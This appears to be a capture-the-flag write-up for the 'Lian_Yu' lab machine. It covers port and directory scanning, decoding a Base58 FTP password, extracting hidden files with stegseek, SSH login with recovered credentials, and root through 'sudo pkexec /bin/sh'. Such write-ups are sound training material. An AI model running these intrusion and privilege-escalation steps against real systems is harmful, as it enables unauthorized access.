
- **Difficulty: Easy**

---

## Reconnaissance

**`nmap` scan**:

```bash
nmap -sV <IP_ADDRESS>
```

Results:

```bash
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp  open  http    Apache httpd
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

---
## Web Enumeration

```bash
gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

Results:

```bash
http://<IP_ADDRESS>/island
```

- `http://<IP_ADDRESS>/island` :

```text
 Ohhh Noo, Don't Talk...............

I wasn't Expecting You at this Moment. I will meet you there

You should find a way to Lian_Yu as we are planed. The Code Word is:
vigilante
```

- Not much here, lets try enumerating `/island`

```bash
feroxbuster -u http://10.10.57.185/island -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Result:

```bash
http://<IP_ADDRESS>/island/2100
```

- From the webpage source:

```html
<!-- you can avail your .ticket here but how?   -->
```

- Lets try enumerating with `-x ticket` this time

```bash
feroxbuster -u http://10.10.57.185/island -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x ticket
```

Result:

```bash
200      GET        6l       11w       71c http://10.10.57.185/island/2100/green_arrow.ticket
```

- Checking out the webpage

```bash
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```

- Putting this string into `cyberchef` and use `from Base58` we get:

```bash
!#th3h00d
```

- Looks to be a pass, we can try using this and the user we found earlier (`vigilante`) to log into `ftp`:

- Nice that works:

```ftp
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
```

- Lets copy all these to our local machine:

```ftp
ftp> mget *
```

### Steganography

- One of the `.png` files is corrupted. We repaired it using `hexeditor` by fixing the PNG header (89 50 4E 47 0D 0A 1A 0A).

- The correct header hex for `.PNG` is 89 50 4E 47 0D 0A 1A 0A

- Within `hexeditor` replace the first set of numbers with the correct heading

- This allows us to open the corrupted `.png` and get the next clue

```bash
eog Leave_me_alone.png

password
```

- Next lets try `stegseek` on `aa.jpg`

```bash
stegseek aa.jpg

[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".
```

- This gives us the same result

- But we do get a new file `aa.jpg.out`

```bash
file aa.jpg.out                              
aa.jpg.out: Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Apr 28 2020 02:06:00, uncompressed size 333, method=deflate
```

- We can `unzip` this

```bash
Archive:  aa.jpg.out
  inflating: passwd.txt              
  inflating: shado  
```

- Lets `cat` the `shado` file:

```bash
M3tahuman
```

- Looks like a pass, lets try plugging this into `ssh`

--- 
## Exploit

- Since this CTF has a lot to do with the show "Green Arrow" and a lot of the images feature the character "slade" lets try that for our `ssh` user and the pass we just found

```bash

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #
```

- We are In!

- `cat` the `user.txt` file

---

## Privilege Escalation

- Running our normal privesc commands:

```bash
slade@LianYu:~$ clear
slade@LianYu:~$ whoami
slade
slade@LianYu:~$ id
uid=1000(slade) gid=1000(slade) groups=1000(slade),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

- User `slade` may run `/usr/bin/pkexec` as `root` 

### GTFObins

```bash
sudo pkexec /bin/sh
```

- Easy! We are now root!

- Last, we can `cat` our `root.txt`

---

[[CTF Notes]]

